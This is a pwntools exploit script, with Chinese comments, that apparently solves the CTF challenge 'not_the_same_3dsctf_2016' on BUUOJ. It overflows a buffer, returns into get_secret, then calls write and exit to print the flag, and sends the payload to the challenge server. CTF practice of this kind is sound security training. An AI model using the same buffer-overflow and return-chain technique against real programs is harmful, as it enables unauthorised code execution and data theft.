'''
@Author       : 白银
@Date         : 2023-04-06 14:30:35
@LastEditors  : 白银
@LastEditTime : 2023-04-06 15:29:27
@FilePath     : /pwn/not_the_same_3dsctf_2016.py
@Description  : https://buuoj.cn/challenges#not_the_same_3dsctf_2016
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './not_the_same_3dsctf_2016'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 28010)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x2d  # ida看，上限是多少
return_addr = 0x80489a0  # 程序里面有get_secret函数，直接找地址
write_addr = 0x806e270 # ida里面找write
exit_addr = 0x804e660 # ida里面找exit
flag_addr = 0x80ECA2D # get_secret()将flag读到此处

# 在缓冲区溢出攻击后没有调用exit()话，会导致程序异常终止，会报错timeout: the monitored command dumped cor
# 1 是文件描述符，表示标准输出
# 45 是要写入到标准输出的字节数
# ssize_t write(int fd, const void *buf, size_t count); //这是write函数
# ssize_t write(1, flag_addr, 4); //这是payload的布局
payload = flat(['a' * padding, return_addr, write_addr, exit_addr, 1, flag_addr, 45])

io.sendline(payload)

io.interactive()